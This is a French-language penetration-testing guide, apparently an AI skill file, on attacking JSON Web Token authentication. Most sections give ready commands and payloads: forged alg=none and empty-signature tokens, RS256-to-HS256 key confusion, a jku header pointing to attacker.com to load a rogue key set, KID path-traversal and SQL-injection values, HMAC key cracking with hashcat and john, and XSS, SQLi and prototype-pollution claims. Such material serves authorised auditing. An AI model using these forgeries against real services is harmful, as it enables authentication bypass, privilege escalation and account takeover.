---
name: jwt-attacks-guide
description: Guide complet d'attaque sur JWT — algorithm confusion, none attack, key泄漏, timing attacks, JWKS injection, KID injection
category: cybersecurite
---

# JWT Attacks — Guide Avancé

## Comprendre JWT

Un JWT (JSON Web Token) se compose de 3 parties encodées en Base64url: `header.payload.signature`

```bash
# Structure
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.MIq3fQ==
# Header        Payload                          Signature
```

### Header Types
```json
{"alg": "HS256", "typ": "JWT"}              // HMAC-SHA256 symétrique
{"alg": "RS256", "typ": "JWT"}              // RSA asymétrique
{"alg": "ES256", "typ": "JWT"}              // ECDSA
{"alg": "EdDSA", "typ": "JWT"}             // Ed25519
{"alg": "none", "typ": "JWT"}              // Pas de signature
```

## Outils Essentiels

| Outil | Description |
|-------|-------------|
| **jwt_tool** | Audit complet JWT |
| **jwt-cracker** | Bruteforce de clés symétriques |
| **john (JWT mode)** | Crack de clés JWT |
| **hashcat (mode 16500)** | Crack HMAC-SHA256 JWT |
| **Python PyJWT / jwcrypto** | Manipulation JWT |
| **jwt.io** | Debugger en ligne |

```bash
# Installation
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python jwt_tool.py <token>

# jwt-cracker
git clone https://github.com/brendan-rius/c-jwt-cracker

# hashcat JWT
hashcat -m 16500 jwt.txt rockyou.txt
```

## Attaque 1: Algorithm Confusion

### none Algorithm (alg=none)
```bash
# Modifier le header
# {"alg":"HS256"} → {"alg":"none","typ":"JWT"}

# Encoder en base64
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
echo -n '{"sub":"admin","iat":1516239022}' | base64 -w0

# Token final: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

# Variantes: None, NONE, nOnE, none, null, None
```

### RS256 → HS256 (Key Confusion)
```bash
# Le serveur utilise RS256 (privée/publique)
# Si on obtient la clé publique, on peut signer en HS256 avec

# 1. Récupérer la clé publique
# Depuis le JWKS endpoint, le cert SSL, le fichier .well-known

# 2. Signer avec la clé publique comme secret HMAC
jwt_tool.py <token> -X a -jwks pubkey.pem

# 3. Envoyer le token modifié avec alg=HS256
```

## Attaque 2: JWKS Injection

```bash
# Forcer l'utilisation d'une JWKS contrôlée par l'attaquant
# Nécessite que le serveur n'ait pas jku validation stricte

# 1. Générer sa propre paire de clés RSA
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# 2. Héberger le JWKS
# https://attacker.com/jwks.json
# Ou exploiter un SSRF pour faire pointer vers son serveur

# 3. Modifier le header
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json","kid":"attacker-key-id"}

# 4. Signer avec sa clé privée
jwt_tool.py <token> -X s -pr attacker.key -jwks attacker.pub
```

## Attaque 3: KID Injection

Le header `kid` (Key ID) est souvent utilisé pour trouver la clé.

### KID Path Traversal
```json
// Si kid est utilisé pour charger un fichier
{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}
```

### KID SQL Injection
```json
// Si kid est une requête SQL
{"alg":"HS256","typ":"JWT","kid":"keys WHERE 1=1 UNION SELECT 'aaaa'"}
```

### KID Null Byte
```json
{"alg":"HS256","typ":"JWT","kid":"/dev/null"}
```

## Attaque 4: Crack de Clé Symétrique

```bash
# Si l'algo est HS256/HS384/HS512 (clé symétrique)
# Bruteforcer la clé

# Avec jwt_tool
jwt_tool.py eyJ...<token> -C -d rockyou.txt

# Avec hashcat
hashcat -m 16500 jwt.txt rockyou.txt

# Avec john
john jwt.txt --wordlist=rockyou.txt

# Avec jwt-cracker
jwt-cracker "<token>" "abcdefghijklmnopqrstuvwxyz" 8
```

## Attaque 5: Signature Non Vérifiée

```bash
# Certains serveurs ne vérifient pas la signature
# Simplement modifier le payload et réencoder

# Décoder le payload
echo -n '<payload>' | base64 -d
# Modifier: user:admin, role:admin
# Réencoder
echo -n '{"sub":"admin","role":"admin"}' | base64 -w0

# Token: header.encoded_payload.SAME_SIGNATURE
```

## Attaque 6: JWT Empty Signature

```bash
# Si la signature est acceptée vide
# Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.

# Ou avec signature = []
// eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.W10

# En PHP: la fonction check_signature peut accepter null
```

## Attaque 7: Timing Attack

```bash
# Certaines implémentations comparent les signatures
# avec === ou avec == ou avec une fonction non-constant-time

# Mesurer le temps de réponse pour chaque caractère
# Attaque par canal auxiliaire
time curl -H "Authorization: Bearer <token>" https://api.target.com/admin
```

## Attaque 8: Réutilisation / Non-Validation

### JWT dans l'URL (Logging)
```bash
# Token dans l'URL → Logs → Fuite
GET /api/v1/users?token=eyJ... HTTP/1.1

# Vérifier Referer
Referer: https://target.com/?token=eyJ...
```

### JWT dans les WebSocket
```bash
# WebSockets → pas de vérification du token
# Si le token est envoyé au handshake seulement
```

### JWT Non-révocation
```bash
# Vérifier si le token peut être utilisé après logout
# Vérifier si le token peut être utilisé après password reset

# Tester
curl -H "Authorization: Bearer <expired_token>" https://api.target.com/admin
```

## Attaque 9: Injection via Claims

```json
// Claims custom non filtrées
// Injection XSS via le nom
{"sub":"admin","name":"<script>alert(1)</script>"}

// Injection SQL
{"sub":"admin' OR 1=1--"}

// Prototype pollution
{"__proto__": {"admin": true}}
```

## Attaque 10: Exploitation du JWKS

```bash
# Forcer l'utilisation d'une JWKS avec une clé faible
# Si le serveur supporte jku (JWKS URL)

# Créer un JWKS endpoint
cat jwks.json
{
    "keys": [{
        "kty": "RSA",
        "use": "sig",
        "kid": "exploit",
        "n": "0vx7agoebGcQSuuPiLJXZpt...",
        "e": "AQAB"
    }]
}

# Avec la clé privée correspondante
# Signer le JWT avec cette clé
jwt_tool.py <token> -X s -jwks jwks.json -pr key.pem
```

## Attaque 11: Token Swap (Cross-Service)

```bash
# Si le même JWT est utilisé pour plusieurs services
# Swap des tokens entre services

# Token admin de service A → service B
# Vérifier si l'aud (audience) est validé
```

## Checklist JWT

1. Vérifier alg=none accepté
2. Tester algorithm confusion (RS→HS)
3. Brute-force clé HMAC (dictionnaire)
4. KID path traversal
5. KID injection SQL
6. JWKS injection (jku)
7. Token non vérifié (signature ignorée)
8. Token expiré accepté
9. Token après logout
10. Token après password change
11. Claims non filtrées (XSS, SQLi)
12. Timing attack
13. JWK embedded dans le header (jwk)
14. Aud/iss validation manquante
15. Token dans URL/logs
16. Empty signature
17. Prototype pollution via __proto__

## Ressources

- **jwt_tool**: https://github.com/ticarpi/jwt_tool
- **HackTricks JWT**: https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens/index.html
- **PayloadsAllTheThings JWT**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
- **JWT.io**: https://jwt.io/
- **jwt-cracker**: https://github.com/brendan-rius/c-jwt-cracker
- **PortSwigger JWT**: https://portswigger.net/web-security/jwt